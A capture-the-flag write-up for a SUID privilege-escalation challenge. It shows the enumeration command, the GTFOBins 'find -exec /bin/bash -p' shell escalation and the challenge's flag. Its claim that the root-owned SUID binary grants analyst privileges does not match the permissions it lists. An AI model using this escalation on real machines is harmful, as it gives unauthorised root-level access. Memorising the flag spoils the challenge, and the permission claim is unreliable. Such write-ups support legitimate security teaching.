# PRIVESC-01: SUID Binary Abuse — Writeup

## Overview
- **Points:** 300
- **Difficulty:** Medium
- **Type:** Privilege Escalation (SUID)
- **Status:** REAL

## Scenario

You have a shell as `www-data`. Enumerate the system for privilege escalation vectors.

## Enumeration

```bash
# Find SUID binaries
find / -perm -4000 -type f 2>/dev/null
```

You'll notice `/usr/bin/find` has the SUID bit set and is owned by `root:analyst`.

```
-rwsr-xr-x 1 root analyst 220K /usr/bin/find
```

## Exploitation (GTFOBins)

```bash
/usr/bin/find . -exec /bin/bash -p \;
```

The `-p` flag preserves the effective UID from the SUID bit → you get analyst privileges.

## Getting the Flag

```bash
cat /home/analyst/.flag_privesc01
```

**Flag:** `FLAG{t1_su1d_find_privesc_9z2}`

## References

- https://gtfobins.github.io/gtfobins/find/
- `man find` — `-exec` option
